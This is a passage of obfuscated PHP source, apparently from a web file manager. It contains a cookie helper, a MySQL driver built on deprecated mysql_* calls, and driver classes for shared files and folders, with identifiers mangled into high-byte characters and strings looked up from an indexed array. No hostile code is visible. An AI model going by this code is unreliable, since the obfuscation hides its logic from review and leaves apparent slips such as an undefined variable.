__construct($ƒì­¾ìë = '', $†¹îÛà‰ = 0) { if (is_string($ƒì­¾ìë) && $ƒì­¾ìë != $_SERVER[áäÒ½¯Ç][12]) { $this->prefix = $ƒì­¾ìë; } if (is_numeric($†¹îÛà‰) && $†¹îÛà‰ > 0) { $this->expire = $†¹îÛà‰; } } public static function getInstance() { static $ñÑ„í±; if ($ñÑ„í± === null) { $ñÑ„í± = new self(); } return $ñÑ„í±; } private static $cookieDisable = false; public static function disable($§ÆŸş«§) { self::$cookieDisable = $§ÆŸş«§; } private static $sameCookieSet = array(); public static function set($æ§ğ•›œ, $å¢çÅâˆ, $åâĞõ´… = 0, $·ÉÍÍ  = false, $Èşğ–Ş³ = false) { $æ†÷Çî =& $_SERVER[áäÒ½¯Ç]; if (self::$cookieDisable) { return; } if (!$åâĞõ´…) { $åâĞõ´… = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$æ§ğ•›œ]) && self::$sameCookieSet[$æ§ğ•›œ] == $å¢çÅâˆ . $åâĞõ´…) { return; } self::$sameCookieSet[$æ§ğ•›œ] = $å¢çÅâˆ . $åâĞõ´…; if (!$Èşğ–Ş³) { $Èşğ–Ş³ = str_replace(HOST, $æ†÷Çî[12], APP_HOST); $Èşğ–Ş³ = _get($GLOBALS, $æ†÷Çî[996], $Èşğ–Ş³); } $•©âŒ‰« = $æ†÷Çî[12]; setcookie($æ§ğ•›œ, $å¢çÅâˆ, time() + $åâĞõ´…, $æ†÷Çî[8] . trim($Èşğ–Ş³, $æ†÷Çî[8]) . $•©âŒ‰«, !1, !1, $·ÉÍÍ ); } public static function setSafe($ì‚£Øª, $Ï×ã¶·û, $–«•ÏñÍ = 0) { self::set($ì‚£Øª, $Ï×ã¶·û, $–«•ÏñÍ, !0); } public static function get($Ø»æíï) { static $¬ªÈ’ú‡ = false; if (!$¬ªÈ’ú‡) { self::initHeaderCookie(); $¬ªÈ’ú‡ = !0; } return isset($_COOKIE[$Ø»æíï]) ? $_COOKIE[$Ø»æíï] : !1; } private static function initHeaderCookie() { $ˆÓ°Ô«ú =& $_SERVER[áäÒ½¯Ç]; if (!isset($_SERVER[$ˆÓ°Ô«ú[997]]) || !$_SERVER[$ˆÓ°Ô«ú[997]]) { return; } $ÃÈÛå¢ü = explode($ˆÓ°Ô«ú[74], $_SERVER[$ˆÓ°Ô«ú[997]]); foreach ($ÃÈÛå¢ü as $–Ÿ¤ãÈÌ) { $–Ÿ¤ãÈÌ = explode($ˆÓ°Ô«ú[473], $–Ÿ¤ãÈÌ); if (count($–Ÿ¤ãÈÌ) != 2 || !isset($–Ÿ¤ãÈÌ[1])) { continue; } $_COOKIE[trim($–Ÿ¤ãÈÌ[0])] = trim($–Ÿ¤ãÈÌ[1]); } } public static function remove($À‘”â’Ú, $‚¡­ñµ‰ = false) { unset($_COOKIE[$À‘”â’Ú]); self::set($À‘”â’Ú, $_SERVER[áäÒ½¯Ç][12], 1, $‚¡­ñµ‰); } } class DbMysql extends Db { public function __construct($¼¨¾¶“® = '') { $¡Ë¦ˆÁ™ =& $_SERVER[áäÒ½¯Ç]; if (!extension_loaded($¡Ë¦ˆÁ™[906])) { think_exception(think_lang($¡Ë¦ˆÁ™[14]) . $¡Ë¦ˆÁ™[998]); } if (!empty($¼¨¾¶“®)) { $this->config = $¼¨¾¶“®; if (empty($this->config[$¡Ë¦ˆÁ™[17]])) { $this->config[$¡Ë¦ˆÁ™[17]] = $¡Ë¦ˆÁ™[12]; } } } public function connect($è½´Ñªá = '', $‘×÷şö = 0, $‘ÈğµœØ = false) { $ŠÙİ——à =& $_SERVER[áäÒ½¯Ç]; if (!isset($this->linkID[$‘×÷şö])) { if (empty($è½´Ñªá)) { $è½´Ñªá = $this->config; } $Š²û²—– = $è½´Ñªá[$ŠÙİ——à[999]] . ($è½´Ñªá[$ŠÙİ——à[1000]] ? "\x3a{$è½´Ñªá[$ŠÙİ——à[1000]]}" : $ŠÙİ——à[12]); $À›êÕôÍ = !empty($è½´Ñªá[$ŠÙİ——à[17]][$ŠÙİ——à[18]]) ? $è½´Ñªá[$ŠÙİ——à[17]][$ŠÙİ——à[18]] : $this->pconnect; if ($À›êÕôÍ) { $this->linkID[$‘×÷şö] = mysql_pconnect($Š²û²—–, $è½´Ñªá[$ŠÙİ——à[1001]], $è½´Ñªá[$ŠÙİ——à[1002]], 131072); } else { $this->linkID[$‘×÷şö] = mysql_connect($Š²û²—–, $è½´Ñªá[$ŠÙİ——à[1001]], $è½´Ñªá[$ŠÙİ——à[1002]], !0, 131072); } if (!$this->linkID[$‘×÷şö] || !empty($è½´Ñªá[$ŠÙİ——à[21]]) && !mysql_select_db($è½´Ñªá[$ŠÙİ——à[21]], $this->linkID[$‘×÷şö])) { think_exception(mysql_error()); } $‚ƒŠÀÎØ = mysql_get_server_info($this->linkID[$‘×÷şö]); mysql_query($ŠÙİ——à[1003] . think_config($ŠÙİ——à[1004]) . $ŠÙİ——à[58], $this->linkID[$‘×÷şö]); if ($‚ƒŠÀÎØ > $ŠÙİ——à[1005]) { mysql_query($ŠÙİ——à[1006], $this->linkID[$‘×÷şö]); } $this->connected = !0; if (1 != think_config($ŠÙİ——à[22])) { unset($this->config); } } return $this->linkID[$‘×÷şö]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($ˆĞÓ™ä) { $’ÅÛõ =& $_SERVER[áäÒ½¯Ç]; if (0 === stripos($ˆĞÓ™ä, $’ÅÛõ[352])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ˆĞÓ™ä; if ($this->queryID) { $this->free(); } think_action_status($’ÅÛõ[23], 1); think_status($’ÅÛõ[24]); $this->queryID = mysql_query($ˆĞÓ™ä, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($±Ú€¿’ß) { $ïì´û§ =& $_SERVER[áäÒ½¯Ç]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $±Ú€¿’ß; if ($this->queryID) { $this->free(); } think_action_status($ïì´û§[25], 1); think_status($ïì´û§[24]); $ Ğ˜®¥ï = mysql_query($±Ú€¿’ß, $this->_linkID); $this->debug(); if (!1 === $ Ğ˜®¥ï) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[áäÒ½¯Ç][1007], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ê½ìÒÇ¯ = mysql_query($_SERVER[áäÒ½¯Ç][1008], $this->_linkID); $this->transTimes = 0; if (!$Ê½ìÒÇ¯) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $²Õ‹Ç¿å = mysql_query($_SERVER[áäÒ½¯Ç][1009], $this->_linkID); $this->transTimes = 0; if (!$²Õ‹Ç¿å) { $this->error(); return !1; } } return !0; } private function getAll() { $½Ôö’¡ú = array(); if ($this->numRows > 0) { while ($åïÁ·› = mysql_fetch_assoc($this->queryID)) { $½Ôö’¡ú[] = $åïÁ·›; } mysql_data_seek($this->queryID, 0); } return $½Ôö’¡ú; } public function getFields($òÇåê‰) { $¡ê™Ê¢» =& $_SERVER[áäÒ½¯Ç]; $¶õ’Ê•° = $this->query($¡ê™Ê¢»[1010] . $this->parseKey($òÇåê‰)); $¿„¿ƒÂÊ = array(); if ($¶õ’Ê•°) { foreach ($¶õ’Ê•° as $İ¹Éúş¬ => $’––šÁ) { $¿„¿ƒÂÊ[$’––šÁ[$¡ê™Ê¢»[31]]] = array($¡ê™Ê¢»[32] => $’––šÁ[$¡ê™Ê¢»[31]], $¡ê™Ê¢»[33] => $’––šÁ[$¡ê™Ê¢»[34]], $¡ê™Ê¢»[35] => (bool) (strtoupper($’––šÁ[$¡ê™Ê¢»[36]]) === $¡ê™Ê¢»[1011]), $¡ê™Ê¢»[37] => $’––šÁ[$¡ê™Ê¢»[38]], $¡ê™Ê¢»[39] => strtolower($’––šÁ[$¡ê™Ê¢»[40]]) == $¡ê™Ê¢»[41], $¡ê™Ê¢»[42] => strtolower($’––šÁ[$¡ê™Ê¢»[43]]) == $¡ê™Ê¢»[44]); } } return $¿„¿ƒÂÊ; } public function getTables($úóÈóšß = '') { $Ö‹ ¾¸ =& $_SERVER[áäÒ½¯Ç]; if (!empty($úóÈóšß)) { $Ë÷«‚ÜÓ = $Ö‹ ¾¸[1012] . $úóÈóšß . $Ö‹ ¾¸[1013]; } else { $Ë÷«‚ÜÓ = $Ö‹ ¾¸[1014]; } $—™Ü‚„Ã = $this->query($Ë÷«‚ÜÓ); $Üß’ˆƒ± = array(); foreach ($—™Ü‚„Ã as $Ü®ñçüÇ => $Œ„ÏÒÆ¢) { $Üß’ˆƒ±[$Ü®ñçüÇ] = current($Œ„ÏÒÆ¢); } return $Üß’ˆƒ±; } public function replace($›°…‰ÔØ, $Æğ¼ÓéÚ = array()) { $çªßÂäâ =& $_SERVER[áäÒ½¯Ç]; foreach ($›°…‰ÔØ as $¶Ãö½¿• => $ŒÁÜÊ§±) { $‘¨Õ—é = $this->parseValue($ŒÁÜÊ§±); if (is_scalar($‘¨Õ—é)) { $—‘ÆØ¾[] = $‘¨Õ—é; $ö ®ñê[] = $this->parseKey($¶Ãö½¿•); } } $´’‡¡ş = $çªßÂäâ[1015] . $this->parseTable($Æğ¼ÓéÚ[$çªßÂäâ[367]]) . $çªßÂäâ[1016] . implode($çªßÂäâ[50], $ö ®ñê) . $çªßÂäâ[1017] . implode($çªßÂäâ[50], $—‘ÆØ¾) . $çªßÂäâ[1018]; return $this->execute($´’‡¡ş); } public function insertAll($Ï§ù’Û, $öùôå¤ = array(), $ÅïÈ™Ùö = false) { $î‡ôß‰Ÿ =& $_SERVER[áäÒ½¯Ç]; if (!is_array($Ï§ù’Û[0])) { return !1; } $Ø¹ûÏ = array_keys($Ï§ù’Û[0]); $Éƒ­¼ì = array(); foreach ($Ï§ù’Û as $Ğšœ÷ô) { $ÇµéÄİ‘ = array(); foreach ($Ğšœ÷ô as $õ»€êìó => $•òêÙĞ) { $•òêÙĞ = $this->parseValue($•òêÙĞ); if (is_scalar($•òêÙĞ)) { $ÇµéÄİ‘[] = $•òêÙĞ; } } $Éƒ­¼ì[] = $î‡ôß‰Ÿ[347] . implode($î‡ôß‰Ÿ[50], $ÇµéÄİ‘) . $î‡ôß‰Ÿ[1018]; } array_walk($Ø¹ûÏ, array($this, $î‡ôß‰Ÿ[1019])); $Ò’Ïë‰ç = $ÅïÈ™Ùö ? $î‡ôß‰Ÿ[1020] : $î‡ôß‰Ÿ[1021]; $Ò’Ïë‰ç = $î‡ôß‰Ÿ[1021]; $“ÃÇ²ã· = $Ò’Ïë‰ç . $î‡ôß‰Ÿ[1022] . $this->parseTable($öùôå¤[$î‡ôß‰Ÿ[367]]) . $î‡ôß‰Ÿ[1016] . implode($î‡ôß‰Ÿ[50], $Ø¹ûÏ) . $î‡ôß‰Ÿ[1023] . implode($î‡ôß‰Ÿ[50], $Éƒ­¼ì); if ($ÅïÈ™Ùö) { $ßÀéïé  = array(); foreach ($Ø¹ûÏ as $õ»€êìó) { if ($õ»€êìó == $î‡ôß‰Ÿ[242] || $õ»€êìó == $î‡ôß‰Ÿ[1024]) { continue; } $ßÀéïé [] = $õ»€êìó . $î‡ôß‰Ÿ[1025] . $õ»€êìó . $î‡ôß‰Ÿ[1018]; } $“ÃÇ²ã· .= $î‡ôß‰Ÿ[1026] . implode($î‡ôß‰Ÿ[50], $ßÀéïé ); } return $this->execute($“ÃÇ²ã·); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $¯í Ò–Î =& $_SERVER[áäÒ½¯Ç]; $this->error = mysql_errno() . $¯í Ò–Î[4] . mysql_error($this->_linkID); if ($¯í Ò–Î[12] != $this->queryStr) { $this->error .= LNG($¯í Ò–Î[48]) . $this->queryStr; } think_trace($this->error, $¯í Ò–Î[12], $¯í Ò–Î[49]); return $this->error; } public function escapeString($ì¢í³Ù) { if ($this->_linkID) { return mysql_real_escape_string($ì¢í³Ù, $this->_linkID); } else { return mysql_escape_string($ì¢í³Ù); } } public function parseKey(&$äºşïŒ”, $ÕÌ‰ñ„ = true) { $–‰ìÂÊ =& $_SERVER[áäÒ½¯Ç]; if ($ÕÌ‰ñ„) { $äºşïŒ” = $this->parseKeyCheck($äºşïŒ”); } if ($äºşïŒ” != $–‰ìÂÊ[231] && !preg_match($–‰ìÂÊ[1027], $äºşïŒ”)) { $äºşïŒ” = $–‰ìÂÊ[481] . trim($äºşïŒ”, $–‰ìÂÊ[481]) . $–‰ìÂÊ[481]; } return $äºşïŒ”; } } goto F¢ˆéŞ‹Ö; d„¯„îŸ¿Ÿ: class PathDriverDriverShareItem { public function __construct($ÈãÓ²°Ü) { $this->pathParse = $ÈãÓ²°Ü; } public function __call($Ä·ø‹›, $ŸÜùåŞ) { $ÈôĞö…¹ =& $_SERVER[áäÒ½¯Ç]; if (method_exists($this, $Ä·ø‹›)) { return; } $Éğº°ûÌ = call_user_func_array(array($ÈôĞö…¹[1491], $Ä·ø‹›), $ŸÜùåŞ); $Òùš‚“œ = array($ÈôĞö…¹[1492], $ÈôĞö…¹[1493], $ÈôĞö…¹[1494], $ÈôĞö…¹[1495], $ÈôĞö…¹[646], $ÈôĞö…¹[648], $ÈôĞö…¹[1496], $ÈôĞö…¹[108], $ÈôĞö…¹[1497], $ÈôĞö…¹[1498]); if (in_array($Ä·ø‹›, $Òùš‚“œ)) { $Éğº°ûÌ = $this->getPathOuter($Éğº°ûÌ); } return $Éğº°ûÌ; } public function copy($Ö¦…‰‚, $µÜê±ÔÛ, $­ÀŒ÷¸æ = false, $•„ŠñÆá = false) { return $this->copyMove($Ö¦…‰‚, $µÜê±ÔÛ, $­ÀŒ÷¸æ, $_SERVER[áäÒ½¯Ç][646], $•„ŠñÆá); } public function move($÷ƒŞ¡İ¡, $Ÿè•ÓœÁ, $Ë‰½·ïŸ = false, $Åä¤Ù¶ = false) { return $this->copyMove($÷ƒŞ¡İ¡, $Ÿè•ÓœÁ, $Ë‰½·ïŸ, $_SERVER[áäÒ½¯Ç][648], $Åä¤Ù¶); } private function copyMove($ƒ¬ÏŞß¼, $ŞÇµÉÉ¤, $÷·’‡¨î, $äÆ‹ùœ, $à‹ÒÛ† = false) { $õ ¥ì×Ä =& $_SERVER[áäÒ½¯Ç]; $Â¡ëõ¼† = $ŞÇµÉÉ¤; $¶´åéÃû = IO::driverMake($ŞÇµÉÉ¤); if ($¶´åéÃû->pathParse[$õ ¥ì×Ä[1283]]) { $ŞÇµÉÉ¤ = $¶´åéÃû->pathParse[$õ ¥ì×Ä[1283]]; } else { $ŞÇµÉÉ¤ = $Â¡ëõ¼†; } $ŸÂ ã²  = IO::copyMove($ƒ¬ÏŞß¼, $ŞÇµÉÉ¤, $÷·’‡¨î, $äÆ‹ùœ, $à‹ÒÛ†); $ŸÂ ã²  = $this->getPathOuter($ŸÂ ã² ); return $ŸÂ ã² ; } public function pathThis($£üÂıÃë) { return get_path_this($this->pathParse[$_SERVER[áäÒ½¯Ç][87]]); } public function pathFather($µ™£ÌÁ¬) { return get_path_father($this->pathParse[$_SERVER[áäÒ½¯Ç][87]]); } public function iconvSystem($íÜ¯°¼—) { return $íÜ¯°¼—; } protected function infoParse($›†ó­–™, $œü¢ç’Ö = false) { $–İ»Èîú =& $_SERVER[áäÒ½¯Ç]; $¨­õæß = $this->pathParse[$–İ»Èîú[581]][$–İ»Èîú[588]] . $this->pathParse[$–İ»Èîú[1302]]; if ($œü¢ç’Ö) { $ÈÇû”¼¡ = IO::infoWithChildren($¨­õæß); } else { $ÈÇû”¼¡ = IO::info($¨­õæß); } $×ÙñŒİ = $this->pathParse[$–İ»Èîú[581]]; return Action($–İ»Èîú[1489])->_shareItemeParse($ÈÇû”¼¡, $×ÙñŒİ); } public function listAll($¥Å©ïÂ´) { $ìåÕ¸ =& $_SERVER[áäÒ½¯Ç]; $¨×ÊÊ°Ş = IO::listAll($¥Å©ïÂ´); $Ä’ÀéŒÂ = rtrim($this->pathParse[$ìåÕ¸[581]][$ìåÕ¸[588]], $ìåÕ¸[8]); foreach ($¨×ÊÊ°Ş as &$¬†Œ…³£) { $¬†Œ…³£[$ìåÕ¸[87]] = $this->pathDriver . $ìåÕ¸[8] . ltrim(substr($¬†Œ…³£[$ìåÕ¸[87]], strlen($Ä’ÀéŒÂ)), $ìåÕ¸[8]); } unset($¬†Œ…³£); return $¨×ÊÊ°Ş; } public function listAllSimple($‡˜ää‡, $ÁªùÙÀƒ = false) { $É‹€†˜Ë =& $_SERVER[áäÒ½¯Ç]; $óÓè˜Ää = $this->listAll($‡˜ää‡); $‚‚š—™¥ = $this->pathParse[$É‹€†˜Ë[515]]; if (trim($‚‚š—™¥, $É‹€†˜Ë[8]) == trim(get_path_father($‚‚š—™¥), $É‹€†˜Ë[8])) { $ÁªùÙÀƒ = !0; } return IO::init($É‹€†˜Ë[12])->listAllSimpleMake($óÓè˜Ää, $‚‚š—™¥, $ÁªùÙÀƒ); } public function getPathOuter($®ø÷ò¶Ó) { $ÎıôÌà¸ =& $_SERVER[áäÒ½¯Ç]; $Ë¥å¬“ˆ = KodIO::parse($®ø÷ò¶Ó); if ($Ë¥å¬“ˆ[$ÎıôÌà¸[33]] == KodIO::KOD_SHARE_ITEM) { return $Ë¥å¬“ˆ[$ÎıôÌà¸[87]]; } $®•Âåê = KodIO::clear($®ø÷ò¶Ó); $‰½ ¥èñ = KodIO::clear($this->pathParse[$ÎıôÌà¸[581]][$ÎıôÌà¸[588]]); $ÕæÔêñ = substr($®•Âåê, strlen($‰½ ¥èñ)); if (substr($®•Âåê, 0, strlen($‰½ ¥èñ)) != $‰½ ¥èñ) { return !1; } return $this->pathParse[$ÎıôÌà¸[1303]] . $ÎıôÌà¸[8] . ltrim($ÕæÔêñ, $ÎıôÌà¸[8]); } public function getType() { $Äö›¾Ë =& $_SERVER[áäÒ½¯Ç]; $Üó€ƒ°¹ = str_replace($Äö›¾Ë[77], $Äö›¾Ë[12], get_class($this)); return strtolower($Üó€ƒ°¹); } public function isOsDriver($íçŒÏä•) { return IO::isOsDriver($íçŒÏä•); } public function info($®®‘Ù½À) { return $this->infoParse($®®‘Ù½À); } public function infoAuth($¥÷Ôæç) { return $this->infoParse($¥÷Ôæç); } public function infoWithChildren($ğòªí¤€) { return $this->infoParse($ğòªí¤€, !0); } public function infoFull($ğçƒú‘Ø) { return $this->infoParse($ğçƒú‘Ø); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ÑŒªœ·) { $this->pathParse = $ÑŒªœ·; } protected function infoParse($¬ÉÚ¥÷¿, $…÷ø‡³˜ = false) { $ù¾ñª„„ =& $_SERVER[áäÒ½¯Ç]; return Action($ù¾ñª„„[1309])->sharePathInfo($this->pathParse[$ù¾ñª„„[87]], !0, $…÷ø‡³˜); } public function listPath($Í†´Ò¼Î, $¯Şê‹¡ = false) { $ÔĞ½• =& $_SERVER[áäÒ½¯Ç]; $¢§£ = IO::listPath($Í†´Ò¼Î, $¯Şê‹¡); if (!$¢§£) { return $¢§£; } if (is_array($¢§£[$ÔĞ½•[1490]])) { $÷‡ã»“ğ = Action($ÔĞ½•[1499])->parsePathChildren($¢§£[$ÔĞ½•[1490]], array($ÔĞ½•[515] => $Í†´Ò¼Î)); $¢§£[$ÔĞ½•[1490]] = Action($ÔĞ½•[1309])->shareItemInfo($÷‡ã»“ğ); } foreach ($¢§£ as $†íâÂ÷ => $´¼·…ñØ) { if (!in_array($†íâÂ÷, array($ÔĞ½•[86], $ÔĞ½•[85]))) { continue; } foreach ($´¼·…ñØ as $³àøåŸ‚ => $÷‡ã»“ğ) { $÷‡ã»“ğ = Action($ÔĞ½•[1499])->parsePathChildren($÷‡ã»“ğ, array($ÔĞ½•[515] => $Í†´Ò¼Î)); $¢§£[$†íâÂ÷][$³àøåŸ‚] = Action($ÔĞ½•[1309])->shareItemInfo($÷‡ã»“ğ); } } return $¢§£; } } class PathDriverDriverShareOuter extends PathDriverBase { public function __construct($·ºêü—¥) { $¬ç¼¸ğÅ =& $_SERVER[áäÒ½¯Ç]; parent::__construct(); $this->uploadChunkSize = 1024 * 1024 * 2; $this->pathParse = $·ºêü—¥; $Áİ™ƒ¦¦ = Model($¬ç¼¸ğÅ[692])->getInfo($·ºêü—¥[$¬ç¼¸ğÅ[492]]); $ëÇ§‰Ò = _get($Áİ™ƒ¦¦, $¬ç¼¸ğÅ[585]); $êÓ²Ğ¥ = Model($¬ç¼¸ğÅ[592])->authMake(_get($Áİ™ƒ¦¦, $¬ç¼¸ğÅ[1500])); if (!$Áİ™ƒ¦¦) { IO::errorTips(LNG($¬ç¼¸ğÅ[1501]), !1); } if (!$êÓ²Ğ¥) { IO::errorTips(LNG($¬ç¼¸ğÅ[1502]), !1); } if ($ëÇ§‰Ò && is_string($ëÇ§‰Ò)) { $ëÇ§‰Ò = json_decode($ëÇ§‰Ò, !0); } if (!$ëÇ§‰Ò || !$êÓ²Ğ¥) { return; } $this->_config = array($¬ç¼¸ğÅ[1303] => rtrim($·ºêü—¥[$¬ç¼¸ğÅ[1303]], $¬ç¼¸ğÅ[8]) . $¬ç¼¸ğÅ[8], $¬ç¼¸ğÅ[1503] => $¬ç¼¸ğÅ[1410] . $ëÇ§‰Ò[$¬ç¼¸ğÅ[1504]] . $¬ç¼¸ğÅ[504], $¬ç¼¸ğÅ[581] => $Áİ™ƒ¦¦, $¬ç¼¸ğÅ[585] => $ëÇ§‰Ò, $¬ç¼¸ğÅ[1505] => $êÓ²Ğ¥, $¬ç¼¸ğÅ[1506] => substr(APP_HOST, 0, 8) == $¬ç¼¸ğÅ[228], $¬ç¼¸ğÅ[1507] => Model($¬ç¼¸ğÅ[596])->authCheck($êÓ²Ğ¥[$¬ç¼¸ğÅ[508]], AuthModel::AUTH_VIEW, !1), $¬ç¼¸ğÅ[1508] => Model($¬ç¼¸ğÅ[596])->authCheck($êÓ²Ğ¥[$¬ç¼¸ğÅ[508]], AuthModel::AUTH_EDIT, !1)); $this->authToken = $this->requestAuthToken(); } public function allowAction($óÂíÈ÷®) { $ñè¼ÎÊ¨ =& $_SERVER[áäÒ½¯Ç]; $ôÉæëàğ = $this->_config; if (!$ôÉæëàğ) { return !1; } $Ğ˜šİâÍ = array($ñè¼ÎÊ¨[1509] => $ôÉæëàğ[$ñè¼ÎÊ¨[1507]], $ñè¼ÎÊ¨[1510] => $ôÉæëàğ[$ñè¼ÎÊ¨[1507]], $ñè¼ÎÊ¨[1331] => $ôÉæëàğ[$ñè¼ÎÊ¨[1507]], $ñè¼ÎÊ¨[108] => $ôÉæëàğ[$ñè¼ÎÊ¨[1508]], $ñè¼ÎÊ¨[1511] => $ôÉæëàğ[$ñè¼ÎÊ¨[1508]], $ñè¼ÎÊ¨[1280] => $ôÉæëàğ[$ñè¼ÎÊ¨[1508]], $ñè¼ÎÊ¨[1512] => !1, $ñè¼ÎÊ¨[439] => !1, $ñè¼ÎÊ¨[1513] => !1, $ñè¼ÎÊ¨[1514] => !1); return $Ğ˜šİâÍ[$óÂíÈ÷®]; } public function listPath($Ä©Û¡§´, $ı¿šôÛª = false) { return $this->request($_SERVER[áäÒ½¯Ç][1515], array($Ä©Û¡§´)); } public function setContent($ñÎçŞò, $©úğè¥ = '') { return $this->request($_SERVER[áäÒ½¯Ç][1516], array($ñÎçŞò, $©úğè¥)); } public function getContent($¸ÒèÓ‚¾) { return $this->_fileSubstr($¸ÒèÓ‚¾); } public function fileSubstr($—Ö¿É«Û, $–“—İ·, $İ­íïÕ•) { return $this->_fileSubstr($—Ö¿É«Û, $–“—İ·, $İ­íïÕ•); } public function download($­™ü¤Ëù, $„²ç‹å„) { return $this->_download($­™ü¤Ëù, $„²ç‹å„); } public function isFileOutServer() { return !1; } public function fileOut($—ÁÍ¼‘Ï, $äÌ‘ÏïØ = false, $Ğï«§è = false, $•µ„âë¨ = '') { $Š©À¡×Ö =& $_SERVER[áäÒ½¯Ç]; $this->fileOutLink($this->_fileLink($—ÁÍ¼‘Ï, ($•µ„âë¨ ? $Š©À¡×Ö[1517] . $•µ„âë¨ : $Š©À¡×Ö[12]) . ($äÌ‘ÏïØ ? $Š©À¡×Ö[1518] : $Š©À¡×Ö[12]))); } public function fileOutImage($Şß¨Ö£ñ, $Ìˆ½¤¦ = 250) { $this->fileOutLink($this->_fileLink($Şß¨Ö£ñ, $_SERVER[áäÒ½¯Ç][1519] . $Ìˆ½¤¦)); } public function fileOutLink($‹Âæİ×) { header($_SERVER[áäÒ½¯Ç][173] . $this->urlAuto($‹Âæİ×)); die; } public function exist($¨š«Æ·Ó) { $œËû‰‡Â = $this->_info($¨š«Æ·Ó); return $œËû‰‡Â ? !0 : !1; } public function isFile($üÃ†›åÃ) { $²ÇµÄÚ  =& $_SERVER[áäÒ½¯Ç]; $÷¥¢åÓ‚ = $this->_info($üÃ†›åÃ); return _get($÷¥¢åÓ‚, $²ÇµÄÚ [33], $²ÇµÄÚ [12]) == $²ÇµÄÚ [241]; } public function isFolder($Èìø¸ØÏ) { $ÑŠºå =& $_SERVER[áäÒ½¯Ç]; $™ïËµ‹Ö = $this->_info($Èìø¸ØÏ); return _get($™ïËµ‹Ö, $ÑŠºå[33], $ÑŠºå[12]) == $ÑŠºå[78]; } public function size($¸…ÙË‰ß) { $“®»íÚ = $this->_info($¸…ÙË‰ß); return _get($“®»íÚ, $_SERVER[áäÒ½¯Ç][79], 0); } public function info($Ò“®ÈÍË) { return $this->_info($Ò“®ÈÍË); } public function infoAuth($«…¨°ï¹) { return $this->_info($«…¨°ï¹); } public function infoFull($Ÿí¹ª¹) { return $this->_info($Ÿí¹ª¹); } public function infoFullSimple($ÊÇ€Ï¥Ä) { return $this->_info($ÊÇ€Ï¥Ä); } public function infoWithChildren($µ“©Õµµ) { return $this->_info($µ“©Õµµ, !0); } public function has($˜Åü§ˆµ, $¾ãÎ±Ë = false, $Ì«ßÎê = false) { $ğ‚ó˜¦º =& $_SERVER[áäÒ½¯Ç]; $ØÁ˜‡ñï = $this->_info($˜Åü§ˆµ); if (!$ØÁ˜‡ñï) { return !1; } if ($¾ãÎ±Ë) { return array($ğ‚ó˜¦º[250] => $ØÁ˜‡ñï[$ğ‚ó˜¦º[250]], $ğ‚ó˜¦º[251] => $ØÁ˜‡ñï[$ğ‚ó˜¦º[251]]); } return $ê¼öú‚ğ ? $ØÁ˜‡ñï[$ğ‚ó˜¦º[250]] > 0 : $ØÁ˜‡ñï[$ğ‚ó˜¦º[251]] > 0; } public function mkfile($€Ò‰À¤, $¦êêİÌ = '', $¶ÈúğÌ = REPEAT_RENAME) { return $this->request($_SERVER[áäÒ½¯Ç][1492], array($€Ò‰À¤, $¦êêİÌ, $¶ÈúğÌ)); } public function mkdir($‹á¤‚òª, $Ø‰œà¾¸ = REPEAT_SKIP) { return $this->request($_SERVER[áäÒ½¯Ç][1493], array($‹á¤‚òª, $Ø‰œà¾¸)); } public function remove($³à±Û±ê) { return $this->request($_SERVER[áäÒ½¯Ç][1280], array($³à±Û±ê)); } public function rename($ÀêÓô‡¼, $Ö£â¾…„) { return $this->request($_SERVER[áäÒ½¯Ç][1496], array($ÀêÓô‡¼, $Ö£â¾…„)); } public function moveSameAllow() { } public function copy($ßµ¤‹¶ñ, $‹ÆÄ¤†×, $Şş¿ãŠ€ = REPEAT_REPLACE, $ıâëÜÂ“ = false) { return $this->request($_SERVER[áäÒ½¯Ç][646], array($ßµ¤‹¶ñ, $‹ÆÄ¤†×, $Şş¿ãŠ€)); } public function move($Ş¾ÄÂ¾Í, $Üº®âú, $çØ¤³„¬ = REPEAT_REPLACE, $ãü€Çõ† = false) { return $this->request($_SERVER[áäÒ½¯Ç][648], array($Ş¾ÄÂ¾Í, $Üº®âú, $çØ¤³„¬)); } public function uploadLink($Î³Ôê¿, $ù„âˆÖ« = 0) { $ù¹®ã” =& $_SERVER[áäÒ½¯Ç]; $ë²…Œêß = IO::init($GLOBALS[$ù¹®ã”[7]][$ù¹®ã”[87]]); $ÜÉ‚å¹´ = $this->pathApiEncode($ë²…Œêß->path); $Ø‘üÉŠ§ = $this->requestMakeUrl($ù¹®ã”[1520], array($ù¹®ã”[87] => $ÜÉ‚å¹´)); return array($ù¹®ã”[1521] => $Ø‘üÉŠ§); } public function upload($æ®óæÕÕ, $Äçâ÷¥ù, $‡ş©ş—ô = false, $Ğ¨öı´ª = REPEAT_REPLACE) { $¤Óü =& $_SERVER[áäÒ½¯Ç]; if (filesize($Äçâ÷¥ù) < $this->uploadChunkSize) { return $this->request($¤Óü[108], array($æ®óæÕÕ, $Äçâ÷¥ù, $Ğ¨öı´ª)); } $Ñ ŞÚğ = $this->uploadHashCheck($æ®óæÕÕ, $Äçâ÷¥ù, $Ğ¨öı´ª); if ($Ñ ŞÚğ) { return $Ñ ŞÚğ; } $©Êº×‘ø = @filesize($Äçâ÷¥ù); $ÂÕÕÉ¼ = $this->uploadChunkSize; $‡¦ÜÒ” = ceil($©Êº×‘ø / $ÂÕÕÉ¼); $æó±ñ¸ = 0; while ($æó±ñ¸ < $‡¦ÜÒ”) { $Œë±¡® = IO::fileSubstr($Äçâ÷¥ù, $æó±ñ¸ * $ÂÕÕÉ¼, $ÂÕÕÉ¼); $É•×ˆËá = $this->tempFile($¤Óü[12], $Œë±¡®); $ÙÏãÖßó = array($¤Óü[79] => $©Êº×‘ø, $¤Óü[1522] 